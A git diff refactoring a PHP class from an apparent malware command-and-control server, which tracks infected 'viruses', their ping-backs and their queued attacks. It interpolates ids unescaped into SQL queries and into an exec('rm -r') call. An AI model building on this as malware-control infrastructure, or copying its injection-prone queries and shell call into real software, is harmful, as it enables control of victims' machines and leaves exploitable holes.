@@ -1,23 +1,27 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Virus;
 
 use Kelvinho\Virus\Attack\AttackFactory;
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\PackageRegistrar;
-use Kelvinho\Virus\Logs;
+use Kelvinho\Virus\Singleton\Logs;
 use function Kelvinho\Virus\db;
 use function Kelvinho\Virus\map;
 
 /**
  * Class Virus
- * @package Kelvinho\Virus
  *
  * Represents a virus. The representation of this will be stored in table viruses, and the data stored on disk is at:
  * DATA_FILE/viruses/{virus_id}/
  *
  * Currently, these are stored on disk:
  * - Profile text, at /profile.txt
+ *
+ * @package Kelvinho\Virus\Virus
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
 class Virus {
     private string $virus_id = "";
@@ -33,20 +37,23 @@ class Virus {
 
     private AttackFactory $attackFactory;
 
-    function __construct(string $virus_id, AttackFactory $attackFactory) {
+    /**
+     * Virus constructor.
+     * @param string $virus_id
+     * @param AttackFactory $attackFactory
+     * @internal
+     */
+    public function __construct(string $virus_id, AttackFactory $attackFactory) {
         $this->virus_id = $virus_id;
         $this->attackFactory = $attackFactory;
         $this->loadState();
     }
 
     /**
-     * The virus will use this to tell that it's still alive and listening
+     * The virus will use this to tell that it's still alive and listening.
      */
     public function ping(): void {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $mysqli->query("update viruses set last_ping = " . time() . " where virus_id = \"$this->virus_id\"");
         $mysqli->close();
     }
@@ -88,9 +95,6 @@ class Virus {
             $attack->delete();
         });
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $mysqli->query("delete from viruses where virus_id = \"$this->virus_id\"");
         $mysqli->close();
         exec("rm -r " . DATA_FILE . "/viruses/$this->virus_id");
@@ -101,9 +105,6 @@ class Virus {
      */
     public function saveState(): void {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $mysqli->query("update viruses set name = \"" . $mysqli->escape_string($this->name) . "\" where virus_id = \"$this->virus_id\"");
         $mysqli->close();
         file_put_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt", $this->profile);
@@ -114,9 +115,6 @@ class Virus {
      */
     private function loadState() {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $row = $mysqli->query("select name, last_ping, type from viruses where virus_id = \"$this->virus_id\"")->fetch_assoc();
         $this->name = $row["name"];
         $this->last_ping = $row["last_ping"];
@@ -136,7 +134,7 @@ class Virus {
     public static function getAttacks(string $virus_id, string $status = null, string $attack_package = null) {
         $whereStatement = "where virus_id = \"" . $virus_id . "\"";
         if ($status != null) {
-            if (in_array($status, AttackInterface::STATUSES)) {
+            if (in_array($status, AttackBase::STATUSES)) {
                 $whereStatement .= " and status = \"$status\"";
             } else {
                 Logs::error("Attack status $status does not exist");
@@ -150,9 +148,6 @@ class Virus {
             }
         }
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $answer = $mysqli->query("select attack_id from attacks $whereStatement order by executed_time desc");
         $mysqli->close();
         $result = [];
@@ -172,9 +167,6 @@ class Virus {
      */
     public static function exists(string $virus_id): bool {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $answer = $mysqli->query("select virus_id from viruses where virus_id = \"" . $mysqli->escape_string($virus_id) . "\"");
         $mysqli->close();
         if ($answer) {
@@ -185,33 +177,7 @@ class Virus {
         }
         return false;
     }
-    /*
-        public static function get(string $virus_id): ?Virus {
-            if (self::exists($virus_id)) {
-                return new Virus($virus_id);
-            } else {
-                return null;
-            }
-        }
-        */
-    /*
-        public static function new(string $user_handle, bool $standalone = true): Virus {
-            $virus_id = Ids::newVirusId();
-            $mysqli = db();
-            if ($mysqli->connect_errno) {
-                Logs::logMysql($mysqli->connect_error);
-            }
-            if ($standalone) {
-                $mysqli->query("insert into viruses (virus_id, user_handle, last_ping, name, active, type) values (\"$virus_id\", \"$user_handle\", 0, \"(not set)\", b'0', b'0')");
-            } else {
-                $mysqli->query("insert into viruses (virus_id, user_handle, last_ping, name, active, type) values (\"$virus_id\", \"$user_handle\", 0, \"(not set)\", b'0', b'1')");
-            }
-            $mysqli->close();
-            mkdir(DATA_FILE . "/viruses/$virus_id");
-            touch(DATA_FILE . "/viruses/$virus_id/profile.txt");
-            return Virus::get($virus_id);
-        }
-    /**/
+
     /**
      * Get state (VIRUS_EXPECTING, VIRUS_ACTIVE, ...) based on the last time the virus pings back
      *
